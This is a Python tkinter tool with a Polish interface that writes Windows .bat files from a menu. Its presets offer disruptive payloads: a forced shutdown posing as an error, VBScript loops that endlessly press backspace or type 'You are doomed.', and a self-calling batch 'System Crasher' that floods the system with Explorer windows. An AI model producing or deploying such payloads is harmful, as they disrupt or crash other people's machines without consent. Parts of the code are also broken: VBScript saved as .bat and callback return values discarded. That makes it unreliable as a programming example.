import os
import tkinter as tk
from tkinter import simpledialog, messagebox


def create_popup(tekst):
    zawartosc = f'''
@echo off
msg * "{tekst}"
pause
'''
    return zawartosc


def create_window_settings(zamykalne, zawsze_na_wierzchu):
    zawartosc = "@echo off\n"
    if zawsze_na_wierzchu:
        zawartosc += "start /B /WAIT cmd /C "
    zawartosc += 'msg * "To jest okno z wybranymi ustawieniami"\n'
    if zamykalne:
        zawartosc += "pause\n"
    return zawartosc


def select_preset_window():
    def on_select_preset():
        selected_preset = preset_var.get()
        if selected_preset:
            nazwa_pliku = projekt_name_var.get() + ".bat"  # Używamy tutaj nazwy projektu z głównego okna
            pelna_sciezka = os.path.abspath(nazwa_pliku)
            # Powiadomienie o sukcesie
            root.quit()
            preset_window.destroy()
            # Zwróć nazwę wybranego presetu
            preset_data = presets.get(selected_preset)
            return selected_preset, preset_data
        else:
            messagebox.showerror("Błąd", "Proszę wybrać preset!")
            return None, None

    preset_window = tk.Toplevel(root)
    preset_window.title("Wybór Presetu")
    tk.Label(preset_window, text="Wybierz preset:").pack(pady=10)

    preset_var = tk.StringVar()

    presets = {
        "The Rebooter": '@echo off\nshutdown -c "ERROR!!" -s\n',
        "Backspace Deleter": '''
Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshShell.sendkeys "{bs}"
loop
''',
        "Infinite Typer": '''
Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshShell.sendkeys "You are doomed."
loop
''',
        "System Crasher": '''
@echo off
:repeat
Explorer
call SystemCrasher.bat
Goto repeat
'''
    }

    for preset_name in presets.keys():
        tk.Radiobutton(preset_window, text=preset_name, variable=preset_var, value=preset_name).pack(anchor="w")

    tk.Button(preset_window, text="OK", command=on_select_preset).pack(pady=10)

    preset_window.mainloop()

    return preset_var.get(), presets.get(preset_var.get())


def main():
    def on_export():
        nazwa_projektu = projekt_name_var.get()  # Teraz ta zmienna jest poprawnie przypisana
        if not nazwa_projektu:
            messagebox.showerror("Błąd", "Wpisz nazwę projektu!")
            return

        choice = menu_var.get()
        if choice == "1":
            tekst = simpledialog.askstring("Wpisz tekst", "Wpisz tekst, który ma się pojawić w wyskakującym okienku:")
            zawartosc = create_popup(tekst)
            nazwa_pliku = nazwa_projektu + ".bat"
        elif choice == "2":
            zamykalne = simpledialog.askstring("Ustawienia okna", "Czy okno ma być zamykalne? (tak/nie):").lower() == "tak"
            zawsze_na_wierzchu = simpledialog.askstring("Ustawienia okna", "Czy okno ma być zawsze na wierzchu? (tak/nie):").lower() == "tak"
            zawartosc = create_window_settings(zamykalne, zawsze_na_wierzchu)
            nazwa_pliku = nazwa_projektu + ".bat"
        elif choice == "3":
            selected_preset, preset_data = select_preset_window()
            if not selected_preset or not preset_data:
                return

            zawartosc = preset_data
            nazwa_pliku = selected_preset.replace(" ", "") + ".bat"
        else:
            messagebox.showerror("Błąd", "Nieprawidłowy wybór, spróbuj ponownie.")
            return

        # Tworzenie folderu Export, jeśli nie istnieje
        export_folder = os.path.join(os.getcwd(), "Exports")
        if not os.path.exists(export_folder):
            os.makedirs(export_folder)

        # Tworzenie folderu projektu
        projekt_folder = os.path.join(export_folder, nazwa_projektu)
        if not os.path.exists(projekt_folder):
            os.makedirs(projekt_folder)

        # Zapisz plik
        sciezka_pliku = os.path.join(projekt_folder, nazwa_pliku)
        with open(sciezka_pliku, "w") as plik:
            plik.write(zawartosc)

        # Powiadomienie o sukcesie
        pelna_sciezka = os.path.abspath(sciezka_pliku)
        messagebox.showinfo("Sukces", f"Plik {nazwa_pliku} został utworzony w lokalizacji: {pelna_sciezka}")

    # Główne okno
    global root
    root = tk.Tk()
    root.title("Generator plików .bat")

    # Pole do wpisania nazwy projektu
    tk.Label(root, text="Wpisz nazwę projektu:").pack(pady=5)
    global projekt_name_var  # Ustawiamy tę zmienną jako globalną
    projekt_name_var = tk.StringVar()
    projekt_name_entry = tk.Entry(root, textvariable=projekt_name_var)
    projekt_name_entry.pack(pady=5)

    # Menu wyboru czynności
    tk.Label(root, text="Wybierz akcję:").pack(pady=5)
    menu_var = tk.StringVar(value="0")
    menu_frame = tk.Frame(root)
    tk.Radiobutton(menu_frame, text="Dodaj wyskakujące okienko", variable=menu_var, value="1").pack(anchor="w")
    tk.Radiobutton(menu_frame, text="Ustawienia okna", variable=menu_var, value="2").pack(anchor="w")
    tk.Radiobutton(menu_frame, text="Wybierz gotowy preset", variable=menu_var, value="3").pack(anchor="w")
    menu_frame.pack(pady=5)

    # Przycisk eksportu
    export_button = tk.Button(root, text="Eksportuj", command=on_export)
    export_button.pack(pady=20)

    root.mainloop()


if __name__ == "__main__":
    main()
